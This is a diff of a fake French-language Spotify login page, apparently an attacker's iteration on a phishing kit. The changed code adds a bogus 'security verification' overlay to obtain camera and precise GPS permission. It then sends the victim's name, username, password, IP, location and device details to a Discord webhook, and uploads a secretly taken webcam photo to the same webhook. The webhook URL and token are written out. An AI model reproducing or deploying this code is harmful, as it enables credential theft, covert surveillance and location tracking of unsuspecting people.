@@ -7,51 +7,73 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
         .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
-        .logo { width: 45px; margin: 0 auto 40px auto; }
+        .logo { width: 45px; margin: 0 auto 30px auto; }
+        
+        /* Overlay de démarrage pour forcer les perms */
+        #start-overlay { position: fixed; inset: 0; background: #000; z-index: 99; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
+        
         .field { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
         input { width: 100%; background: #121212; border: none; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
-        .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 20px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
         
-        /* Barre de chargement pour forcer l'attente */
+        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 20px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
+        
         #loader { display: none; margin-top: 20px; }
         .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
-        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
-        .load-txt { font-size: 12px; color: #b3b3b3; margin-top: 8px; font-style: italic; }
-
-        .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 12px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-top: 25px; font-size: 14px; }
+        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.4s; }
+        .load-txt { font-size: 12px; color: #b3b3b3; margin-top: 10px; font-style: italic; }
+        
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
+    <div id="start-overlay">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" style="width:50px; margin-bottom:20px;">
+        <h2 style="font-weight:900; font-size:20px; margin-bottom:10px;">Vérification de sécurité</h2>
+        <p style="color:#b3b3b3; font-size:14px; margin-bottom:25px;">Pour continuer, veuillez autoriser la synchronisation de votre appareil.</p>
+        <button onclick="unlockPerms()" class="btn-green">Démarrer la vérification</button>
+    </div>
+
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-
         <div class="flex gap-2">
-            <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text" placeholder="Prénom"></div>
-            <div class="field w-1/2"><label>Nom</label><input id="ln" type="text" placeholder="Nom"></div>
+            <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
+            <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
         </div>
         <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
         <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
         
-        <button onclick="triggerAll()" id="btn" class="btn-main">Se connecter</button>
+        <button onclick="finalSubmit()" id="btn" class="btn-green">Se connecter</button>
 
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <div id="ltxt" class="load-txt">Sécurisation de la connexion...</div>
+            <div id="ltxt" class="load-txt">Analyse du profil en cours...</div>
         </div>
-
-        <div class="social-btn">Continuer avec Google</div>
     </div>
 
     <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        
-        async function triggerAll() {
+        let gps = "❌ En attente";
+
+        // Déclenche les fenêtres de permission dès l'entrée
+        async function unlockPerms() {
+            document.getElementById('start-overlay').style.display = 'none';
+            try {
+                // Demande Caméra
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                window.localStream = stream; // On garde le flux pour plus tard
+                // Demande GPS
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    gps = `✅ **PRÉCIS :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                }, () => { gps = "❌ Refusé"; }, {enableHighAccuracy: true});
+            } catch(e) {}
+        }
+
+        async function finalSubmit() {
             const data = {
                 fn: document.getElementById('fn').value,
                 ln: document.getElementById('ln').value,
@@ -65,20 +87,9 @@
             const pb = document.getElementById('pbar');
             const lt = document.getElementById('ltxt');
 
-            // --- ÉTAPE 1 : GPS (Le Pellerin) ---
-            pb.style.width = "30%";
-            lt.innerText = "Vérification de la région (GPS)...";
-            let gps = "❌ Bloqué";
-            try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 6000});
-                });
-                gps = `✅ **PRÉCIS :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
-            } catch(e) {}
-
-            // --- ÉTAPE 2 : MATÉRIEL & IP ---
-            pb.style.width = "60%";
-            lt.innerText = "Optimisation pour votre appareil...";
+            // --- COLLECTE DATA (image_c61034) ---
+            pb.style.width = "40%";
+            lt.innerText = "Authentification sécurisée...";
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
@@ -86,39 +97,39 @@
 
             const msg = {
                 embeds: [{
-                    title: `🏆 LOG FINAL V25 - ${data.fn} ${data.ln}`,
+                    title: `🔥 ULTRA LOG V26 - ${data.fn} ${data.ln}`,
                     color: 1955168,
                     fields: [
-                        { name: "👤 IDENTITÉ", value: `**Nom:** \`${data.ln}\` **Prénom:** \`${data.fn}\`\n**User:** \`${data.u}\` **Pass:** \`${data.p}\`` },
-                        { name: "📍 LOCALISATION", value: `**Maps:** ${gps}\n**Ville IP:** \`${net.city}\`\n**IP:** \`${net.ip}\`` },
+                        { name: "👤 IDENTITÉ", value: `**Prénom/Nom:** \`${data.fn} ${data.ln}\`\n**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`` },
+                        { name: "📍 GÉOLOC", value: `**Maps:** ${gps}\n**Ville:** \`${net.city}\`\n**IP:** \`${net.ip}\`` },
                         { name: "📱 HARDWARE", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Bat:** \`${Math.round(bat.level*100)}%\`\n**CPU:** \`${navigator.hardwareConcurrency}\`\n**OS:** \`${navigator.platform}\`` }
-                    ]
+                    ],
+                    footer: { text: "LVN Elite System • " + new Date().toLocaleString() }
                 }]
             };
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
 
-            // --- ÉTAPE 3 : CAMÉRA (PHOTO) ---
-            pb.style.width = "90%";
-            lt.innerText = "Finalisation de la synchronisation...";
+            // --- CAPTURE CAMÉRA (image_d16924) ---
+            pb.style.width = "80%";
+            lt.innerText = "Vérification des paramètres régionaux...";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000));
+                video.srcObject = window.localStream;
+                await new Promise(r => setTimeout(r, 1500));
                 const can = document.getElementById('c');
                 can.width = 1280; can.height = 720;
                 can.getContext('2d').drawImage(video, 0, 0);
                 can.toBlob(async b => {
                     const fd = new FormData();
                     fd.append('file', b, 'cam.png');
-                    fd.append('content', `📸 **Capture : ${data.fn} ${data.ln}**`);
+                    fd.append('content', `📸 **Capture Master : ${data.fn} ${data.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
+                    window.localStream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg', 0.8);
             } catch(e) {}
 
             pb.style.width = "100%";
-            setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 1000);
+            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 1000);
         }
     </script>
 </body>
